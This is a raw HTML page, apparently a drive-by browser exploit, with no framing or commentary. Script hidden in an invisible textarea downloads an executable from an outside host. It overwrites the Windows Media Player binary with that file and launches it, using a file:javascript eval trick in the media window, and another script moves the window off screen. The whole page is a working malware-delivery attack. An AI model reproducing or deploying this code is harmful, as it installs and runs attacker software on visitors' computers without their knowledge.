<script language=3D"vbs">
self.MoveTo 5000,5000
</script>
<object data=3D"1.php"></object>

<textarea id=3D"code" style=3D"display:none;">

    var x =3D new ActiveXObject("Microsoft.XMLHTTP");
    x.Open("GET", "http://doz.linux162.onway.net/eg/1.exe",0);
    x.Send();

    var s =3D new ActiveXObject("ADODB.Stream");
    s.Mode =3D 3;
    s.Type =3D 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media =
Player\\wmplayer.exe",2);
    location.href =3D "mms://";

</textarea>

<script language=3D"javascript">

    function preparecode(code) {
        result =3D '';
        lines =3D code.split(/\r\n/);
        for (i=3D0;i<lines.length;i++) {

            line =3D lines[i];
            line =3D line.replace(/^\s+/,"");
            line =3D line.replace(/\s+$/,"");
            line =3D line.replace(/'/g,"\\'");
            line =3D line.replace(/[\\]/g,"\\\\");
            line =3D line.replace(/[/]/g,"%2f");

            if (line !=3D '') {
                result +=3D line +'\\r\\n';
            }
        }
        return result;
    }

    function doit() {
        mycode =3D preparecode(document.all.code.value);
        myURL =3D "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media")
    }


    window.open("error.jsp","_media");

    setTimeout("doit()", 5000);


</script>